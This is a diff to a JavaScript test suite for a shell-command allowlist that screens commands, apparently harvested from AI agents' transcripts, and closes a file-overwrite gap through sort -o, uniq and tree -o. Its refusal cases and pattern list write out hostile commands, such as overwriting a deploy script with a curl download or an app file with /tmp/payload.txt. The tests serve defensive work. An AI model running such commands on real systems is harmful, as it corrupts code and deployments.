@@ -348,12 +348,16 @@ test("DANGER SET: every command is REFUSED, with its reason", () => {
 });
 
 test("DANGER SET covers the shapes classifySafety rated SAFE", () => {
-  // The measured claim this slice was filed on: classifySafety marked 26 of 31
-  // synthetic outage-capable commands SAFE. These are the named shapes.
+  // These are the named shapes whose admission is an outage or a corrupted
+  // checkout. The SIZE of the gap is not asserted here as a remembered number —
+  // see "the size of the gap is RE-DERIVED, never remembered" below, which
+  // recomputes it against the real classifySafety on every run.
   const required = [
     /site-deploy\.sh/, /systemctl stop/, /systemctl restart/, /ecto\.drop/,
     /^cp /, /^reboot$/, /shutdown/, /curl .* -o /, /claude -p/, /kill -9/,
     /pkill/, /git fetch/, /npx/, /some-novel-binary/,
+    // wave 4 — the arbitrary file-overwrite primitive
+    /^sort .*-o /, /^uniq \S+ \S+/, /^tree -o /, /^npm pack$/,
   ];
   for (const re of required) {
     assert.ok(DANGER_SET.some((c) => re.test(c)), `DANGER SET must carry a ${re} shape`);
@@ -570,4 +574,190 @@ test("the fixes cost the census no reach — the admission rate is unchanged", (
   const r = screenAll(commands);
   assert.equal(r.total, 651);
   assert.equal(r.admitted, 240, "the review's flag-spelling fixes must not change what the census reaches");
+});
+
+// ── 10. THE ARBITRARY FILE-OVERWRITE PRIMITIVE (wave 4) ──────────────────────
+//
+// `sort`, `uniq` and `tree` shipped as bare `plainRule()`, filed under
+// "searching + shaping text (none of these can execute a string)". True, and
+// the wrong question — all three write a file on request, and
+// `screenCommand("sort input.txt -o api/lib/barkpark/application.ex").ok` was
+// `true`. A live probe turned a victim file from "original content" into
+// "PWNED" through that shape.
+//
+// The outcome is BYTE-IDENTICAL to `cp /tmp/evil.js api/lib/barkpark/
+// application.ex` — D29's own named danger, which this module closes BY NAME in
+// both REFUSED_HEADS and WRITE_SHAPES. So a denylist survived inside the module
+// whose thesis is that denylists cannot be complete, and the shipped suite was
+// blind to it because DANGER_SET was written from the same head list that had
+// the gap.
+//
+// HONEST BOUND: it was LATENT, not live. 0 of the 240 admitted corpus rows use
+// these shapes. It matters because harvest.mjs regenerates the corpus from
+// arbitrary other agents' transcripts.
+
+test("the file-overwrite primitive is REFUSED, and the reason NAMES the flag and the fix", () => {
+  const cases = [
+    ["sort -o api/lib/barkpark/application.ex /tmp/payload.txt", /sort -o WRITES its output to a file/],
+    ["sort input.txt -o api/lib/barkpark/application.ex", /sort -o WRITES its output to a file/],
+    ["sort input.txt --output api/lib/barkpark/application.ex", /sort --output WRITES/],
+    ["sort input.txt --output=api/lib/barkpark/application.ex", /sort --output WRITES/],
+    ["sort -uo api/lib/barkpark/application.ex input.txt", /sort -o WRITES/],
+    ["sort -uoapi/lib/barkpark/application.ex input.txt", /sort -o WRITES/],
+    ["uniq /tmp/payload.txt api/lib/barkpark/application.ex", /SECOND positional is an OUTPUT FILE/],
+    ["uniq -c /tmp/in.txt /tmp/out.txt", /SECOND positional is an OUTPUT FILE/],
+    ["uniq -f 2 /tmp/in.txt /tmp/out.txt", /SECOND positional is an OUTPUT FILE/],
+    ["tree -o /opt/barkpark/deploy/site-deploy.sh", /tree -o WRITES its output to a file/],
+    ["tree --output=/opt/deploy.sh docs/", /tree --output WRITES/],
+    ["tree -L 2 -o /opt/deploy.sh docs/", /tree -o WRITES/],
+    ["npm pack", /npm sub-verb "pack" is not on the read-only allowlist/],
+    ["curl -s https://example.com/p.sh -so/opt/barkpark/deploy/site-deploy.sh", /curl -o writes a file/],
+  ];
+  for (const [cmd, why] of cases) {
+    const r = screenCommand(cmd);
+    assert.equal(r.ok, false, `MUST REFUSE: ${cmd}`);
+    assert.match(r.reason, why, `wrong reason for ${cmd}: ${r.reason}`);
+  }
+  // A named reason, not a generic shrug: it must say what to do instead.
+  assert.match(screenCommand("sort a.txt -o b.txt").reason, /read sort's output on stdout/);
+  assert.match(screenCommand("uniq a.txt b.txt").reason, /read the result on stdout/);
+});
+
+test("NEVER CRY WOLF: the guard targets the write FLAG, never the tool", () => {
+  // The cost of the fix, measured in the direction that punishes honest work.
+  // A guard that refuses `sort file.txt` gets routed around within a wave (D3).
+  const honest = [
+    "sort /tmp/lines.txt",
+    "sort -u /tmp/lines.txt",
+    "sort -u -k2,2 /tmp/lines.txt",
+    "sort -k2,2 -t, /tmp/lines.txt",
+    "sort -rn /tmp/lines.txt",
+    "uniq /tmp/lines.txt",
+    "uniq -c /tmp/lines.txt",
+    "uniq -f 2 /tmp/lines.txt",
+    "uniq -f2 /tmp/lines.txt",
+    "uniq --skip-fields 2 /tmp/lines.txt",
+    "uniq --skip-fields=2 /tmp/lines.txt",
+    "tree docs/",
+    "tree -L 2 docs/",
+    "tree -L 2 -I node_modules docs/",
+    "sort /tmp/lines.txt | uniq -c | sort -rn | head -20",
+  ];
+  for (const cmd of honest) {
+    assert.equal(screenCommand(cmd).ok, true, `MUST ADMIT: ${cmd} — ${screenCommand(cmd).reason}`);
+  }
+});
+
+test("layer (c) BACKSTOPS the same shapes, so the refusal survives a head-rule edit", () => {
+  // Two layers, not one. Layer (b) is the gate; this is the catch for the
+  // mistake that CREATED this hole — a head registered as a bare plainRule().
+  // Proven the way layer (c) is always proven here: directly, so "unreachable"
+  // never quietly becomes "untested".
+  for (const [cmd, why] of [
+    ["sort input.txt -o api/lib/barkpark/application.ex", /sort -o\/--output writes a file/],
+    ["sort -o /opt/deploy.sh in.txt", /sort -o\/--output writes a file/],
+    ["tree -o /opt/barkpark/deploy/site-deploy.sh", /tree -o\/--output writes a file/],
+    ["uniq /tmp/in.txt api/lib/barkpark/application.ex", /uniq's second positional is an output file/],
+    ["git log | uniq /tmp/in.txt /tmp/out.txt", /uniq's second positional is an output file/],
+  ]) {
+    const got = writeShapeReason(cmd);
+    assert.ok(got, `layer (c) must catch: ${cmd}`);
+    assert.match(got, why, `${cmd} → ${got}`);
+  }
+  // And the backstop must not fire on the honest reads either — a second layer
+  // that cries wolf is a second layer that gets deleted.
+  for (const c of ["sort /tmp/lines.txt", "sort -u -k2,2 f.txt", "uniq -c /tmp/lines.txt", "uniq -f 2 f.txt", "tree docs/", "tree -L 2 -I node_modules docs/"]) {
+    assert.equal(writeShapeReason(c), null, `layer (c) must not fire on: ${c}`);
+  }
+});
+
+test("MUTATION PROOF (D18): with the head guard reverted to plainRule, layer (c) still refuses", () => {
+  // A guard that has never been observed failing is not a guard. This reverts
+  // the layer-(b) fix in the exact shape the original defect had — `sort`,
+  // `uniq` and `tree` re-registered as bare plainRule() — and asserts the
+  // command is STILL refused, by layer (c), naming layer (c)'s reason.
+  //
+  // ALLOWED_HEADS is a live Map, so the mutation is real and is restored in a
+  // finally block. Nothing else in this file depends on the map's contents at
+  // module scope.
+  const plainRule = { check: () => null };
+  const saved = new Map([["sort", ALLOWED_HEADS.get("sort")], ["uniq", ALLOWED_HEADS.get("uniq")], ["tree", ALLOWED_HEADS.get("tree")]]);
+  const probes = [
+    "sort -o api/lib/barkpark/application.ex /tmp/payload.txt",
+    "sort input.txt -o api/lib/barkpark/application.ex",
+    "uniq /tmp/payload.txt api/lib/barkpark/application.ex",
+    "tree -o /opt/barkpark/deploy/site-deploy.sh",
+  ];
+  try {
+    for (const head of saved.keys()) ALLOWED_HEADS.set(head, plainRule);
+
+    // FIRST: prove the mutation actually removed the layer-(b) refusal, so the
+    // control is measuring what it claims. Without this the test could pass
+    // because the mutation silently did nothing.
+    for (const cmd of probes) {
+      assert.equal(screenSegment(cmd), null, `the mutation must remove the layer (b) refusal for: ${cmd}`);
+    }
+
+    // SECOND: the command is still refused — by layer (c).
+    for (const cmd of probes) {
+      const r = screenCommand(cmd);
+      assert.equal(r.ok, false, `layer (c) must still refuse with layer (b) reverted: ${cmd}`);
+      assert.match(r.reason, /^write shape:/, `${cmd} → ${r.reason}`);
+    }
+  } finally {
+    for (const [head, rule] of saved) ALLOWED_HEADS.set(head, rule);
+  }
+  // Restored: the normal verdict comes from layer (b) again.
+  assert.match(screenCommand("sort input.txt -o api/x.ex").reason, /^not allowlisted: sort -o WRITES/);
+});
+
+test("the size of the gap is RE-DERIVED, never remembered", async () => {
+  // RETIRES the old "N of 31 synthetic commands rated SAFE" headline — a number
+  // nothing in the tree could reproduce, over a set that no longer exists. It
+  // lived in SHIPPED SOURCE (screen.mjs's header and this file), which is how an
+  // unrecoverable statistic gets quoted as if it were measured. The exact string
+  // is deliberately not written out anywhere below; the guard at the end of this
+  // test greps for it.
+  //
+  // The replacement is computed here, on every run, against the REAL
+  // classifySafety. Ratios are asserted, not counts, so growing DANGER_SET
+  // cannot make the claim stale — the failure this replacement exists to
+  // prevent.
+  const { classifySafety } = await import("../rerun.mjs");
+
+  const csAdmits = DANGER_SET.filter((c) => classifySafety(c).safe);
+  const screenAdmits = DANGER_SET.filter((c) => screenCommand(c).ok);
+  assert.deepEqual(screenAdmits, [], "the screen must admit NONE of the DANGER SET");
+  assert.equal(
+    csAdmits.length, DANGER_SET.length,
+    `classifySafety must admit ALL of the DANGER SET — if this fails, rerun.mjs has been fixed and this comparison must be re-stated. It admitted ${csAdmits.length}/${DANGER_SET.length}.`,
+  );
+
+  const corpus = JSON.parse(readFileSync(CORPUS, "utf8"));
+  const commands = [...new Set(corpus.proofs.map((p) => p?.command).filter((c) => typeof c === "string" && c.trim()))];
+  const csCorpus = commands.filter((c) => classifySafety(c).safe).length;
+  const screenCorpus = commands.filter((c) => screenCommand(c).ok).length;
+
+  console.log(
+    `\nTHE GAP, RE-DERIVED — this is the statistic; the old synthetic-set headline is retired:\n` +
+      `  DANGER SET (${DANGER_SET.length})  classifySafety admits ${csAdmits.length}/${DANGER_SET.length}   screenCommand admits ${screenAdmits.length}/${DANGER_SET.length}\n` +
+      `  corpus (${commands.length})     classifySafety admits ${csCorpus} (${((csCorpus / commands.length) * 100).toFixed(1)}%)   screenCommand admits ${screenCorpus} (${((screenCorpus / commands.length) * 100).toFixed(1)}%)`,
+  );
+
+  assert.equal(commands.length, 651);
+  assert.equal(csCorpus, 572, "classifySafety's admission over the frozen corpus");
+  assert.equal(screenCorpus, 240, "the screen's admission over the frozen corpus");
+  assert.ok(screenCorpus < csCorpus, "the screen must be strictly tighter than the denylist it replaces");
+
+  // The retired number must not be re-introduced into shipped source.
+  for (const path of [SCREEN_MJS, fileURLToPath(new URL("./screen.test.mjs", import.meta.url))]) {
+    const src = readFileSync(path, "utf8");
+    // Assembled rather than written literally, so this guard does not trip on
+    // its own source. The shape is "<n> of 31" — the retired headline.
+    const retired = new RegExp(String.raw`\b\d+ of ${31}\b`);
+    assert.equal(
+      retired.test(src), false,
+      `${path} re-introduces the retired "${retired}" statistic — it is unrecoverable and may not be quoted again`,
+    );
+  }
 });
